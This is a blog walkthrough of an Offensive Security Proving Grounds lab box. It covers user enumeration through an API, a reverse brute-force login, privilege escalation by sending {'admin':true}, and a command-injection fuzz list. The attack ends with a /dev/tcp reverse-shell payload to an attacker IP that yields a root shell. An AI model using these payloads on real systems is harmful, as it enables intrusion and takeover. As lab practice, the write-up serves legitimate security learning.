---
layout: post
author: H4
---

This is an Offensive Security proving grounds practice box.

# enumeration

Starting with a simple `nmap` scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn -p- -sV 192.168.135.106
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-08 00:28 EST
Nmap scan report for 192.168.135.106
Host is up (0.022s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Node.js Express framework
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.80 seconds
```

## web server (port 80)
The web server provides a self built application made with `node.js`.

---

# exploitation
## user enumeration

The application provides an `API` endpoint which allows to enumerate the users of the application.

### request
```http
GET /api/users HTTP/1.1
Host: 192.168.135.106
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Referer: http://192.168.135.106/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3AMJ1jG892oKVwRi3rIMKyjsDm5uBSY8Vd.ZOktdXW76go01TGeemuMa%2BzSdZYoPowTicSZVFdGyzY
Connection: close
```

### response
```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 17631
ETag: W/"44df-pZIEBbTSCxHDoXwBwgjxnrd/BcI"
Date: Tue, 08 Feb 2022 05:45:39 GMT
Connection: close

["roxanne","nestor","evelyn","jerrold","dianna","lindsey","clair",...
```

> We may can use this information to perform a `reverse brute force` attack to gain access to the application.
{: .prompt-info }

## `reverse brute` force login
Now we are performing a `reverse brute force` attack with `hydra` or `burpsuite` to check if any of the enumerated accounts uses the password `password`.

> successfull login for `dev-acct`
{: .prompt-info }

### login request
```http
POST /login HTTP/1.1
Host: 192.168.135.106
Content-Length: 45
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Content-Type: application/json
Origin: http://192.168.135.106
Referer: http://192.168.135.106/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3A6CNkIR8TsvD0kH2rTmXKG5N2IYusjBIf.u6UY4ec5xqLFUUIeSDmLY5yMrhwCmQ1gbcByzcOzXaM
Connection: close

{"username":"dev-acct","password":"password"}
```

### login response
```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/plain; charset=utf-8
Content-Length: 2
ETag: W/"2-nOO9QiTIwXgNtWtBJezz8kv3SLc"
Set-Cookie: connect.sid=s%3AMJ1jG892oKVwRi3rIMKyjsDm5uBSY8Vd.ZOktdXW76go01TGeemuMa%2BzSdZYoPowTicSZVFdGyzY; Path=/; HttpOnly
Date: Tue, 08 Feb 2022 05:29:54 GMT
Connection: close

OK
```

> Yay! We got a valid user account.
{: .prompt-info }

## check user settings

Now we are using the `API` to check the settings of the user `dev-acct`.

### request
```http
GET /api/settings HTTP/1.1
Host: 192.168.135.106
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Referer: http://192.168.135.106/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3AMJ1jG892oKVwRi3rIMKyjsDm5uBSY8Vd.ZOktdXW76go01TGeemuMa%2BzSdZYoPowTicSZVFdGyzY
Connection: close
```

### response
```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 48
ETag: W/"30-onnGf9UI1fkFgxSDXSX53FR+X8U"
Date: Tue, 08 Feb 2022 05:48:38 GMT
Connection: close

{"color-theme":"light","lang":"en","admin":false}
```

> Unfortunately we are not an admin.
{: .prompt-danger }

## escalate to an admin account
Observing the `API` requests reveals that when changing ui mode a post request is made to `/api/settings`

### ui change request
```http
POST /api/settings HTTP/1.1
Host: 192.168.135.106
Content-Length: 23
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Content-Type: application/json
Origin: http://192.168.135.106
Referer: http://192.168.135.106/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3AMJ1jG892oKVwRi3rIMKyjsDm5uBSY8Vd.ZOktdXW76go01TGeemuMa%2BzSdZYoPowTicSZVFdGyzY
Connection: close

{"color-theme":"light"}
```

### ui change response
```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/plain; charset=utf-8
Content-Length: 2
ETag: W/"2-nOO9QiTIwXgNtWtBJezz8kv3SLc"
Date: Tue, 08 Feb 2022 05:35:18 GMT
Connection: close

OK
```

Now let us check if we are able to change the user settings in a way we elevate the account `dev-acct` to an admin account.

### escalate request
```http
POST /api/settings HTTP/1.1
Host: 192.168.135.106
Content-Length: 14
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Content-Type: application/json
Origin: http://192.168.135.106
Referer: http://192.168.135.106/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3AMJ1jG892oKVwRi3rIMKyjsDm5uBSY8Vd.ZOktdXW76go01TGeemuMa%2BzSdZYoPowTicSZVFdGyzY
Connection: close

{"admin":true}
```

### escalate response
```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/plain; charset=utf-8
Content-Length: 2
ETag: W/"2-nOO9QiTIwXgNtWtBJezz8kv3SLc"
Date: Tue, 08 Feb 2022 05:35:42 GMT
Connection: close

OK
```

Now we check `dev-acct` user settings again.

### request
```http
GET /api/settings HTTP/1.1
Host: 192.168.135.106
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Referer: http://192.168.135.106/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3AMJ1jG892oKVwRi3rIMKyjsDm5uBSY8Vd.ZOktdXW76go01TGeemuMa%2BzSdZYoPowTicSZVFdGyzY
Connection: close
```

### response
```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 48
ETag: W/"30-onnGf9UI1fkFgxSDXSX53FR+X8U"
Date: Tue, 08 Feb 2022 05:51:52 GMT
Connection: close

{"color-theme":"light","lang":"en","admin":true}
```

> We are an admin now! :-)
{: .prompt-info }

## exploit backup feature
Inside the admin panel is feature to create backup files.

### request
```http
GET /api/backup?filename=test	 HTTP/1.1
Host: 192.168.135.106
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Referer: http://192.168.135.106/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3AMJ1jG892oKVwRi3rIMKyjsDm5uBSY8Vd.ZOktdXW76go01TGeemuMa%2BzSdZYoPowTicSZVFdGyzY
Connection: close
```

### response
```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 44
ETag: W/"2c-K9ryfEAj0wbbLVJlnQsRB91shk0"
Date: Tue, 08 Feb 2022 05:52:45 GMT
Connection: close

Created backup: /var/log/app/logfile-test.gz
```

The application seems to perform some kind of compression task in the background on operating system level.  
This is a good indication that there might be a possibility to gain access via code execution.
  
We are using now our `burpsuite` `intruder` to check the output for the following test strings.  
We make the `intruder` changing the value `filename` in the `POST` request with every iteration.

```
;id
|id
`id`
$i()d
;$i()d
|$i()d
FAIL||;$i()d
&&id
&id
FAIL_INTENT|id
FAIL_INTENT||id
`sleep 5`
`sleep 10`
`id`
$(sleep 5)
$(sleep 10)
$(id)
;`echo 'aWQK' |base64 -d`
FAIL_INTENT|`echo 'aWQK' |base64 -d`
FAIL_INTENT||`echo 'aWQK' |base64 -d`
```

Reviewing the output of the `intruder` reveals that `$(sleep 5)` seems to work.  
This means that a command injection with `$()` is possible

## `RCE` with backup feature
We are starting with creating a reverse shell to execute commands on the target interactively.

### start listener on attacker machine
```bash
$ nc -lvp 80                          
listening on [any] 80 ...
```

### trigger reverse shell
payload: `$(bash -c 'bash -i >& /dev/tcp/192.168.49.135/80 0>&1')`
```http
GET /api/backup?filename=$(bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.135/80+0>%261')	 HTTP/1.1
Host: 192.168.135.106
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Referer: http://192.168.135.106/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3AMJ1jG892oKVwRi3rIMKyjsDm5uBSY8Vd.ZOktdXW76go01TGeemuMa%2BzSdZYoPowTicSZVFdGyzY
Connection: close
```

### catch connect from target
```bash
$ nc -lvp 80                          
listening on [any] 80 ...
192.168.135.106: inverse host lookup failed: Unknown host
connect to [192.168.49.135] from (UNKNOWN) [192.168.135.106] 47970
bash: cannot set terminal process group (432): Inappropriate ioctl for device
bash: no job control in this shell
root@interface:/var/www/app/dist# whoami
whoami
root
```

> Root shell!
{: .prompt-info }

---

# get flag
```bash
root@interface:/var/www/app/dist# cd /root
cd /root
root@interface:~# ls
ls
proof.txt
qwe.gz
root@interface:~# cat proof.txt
cat proof.txt
9******************************6
```

Pwned! <@:-)
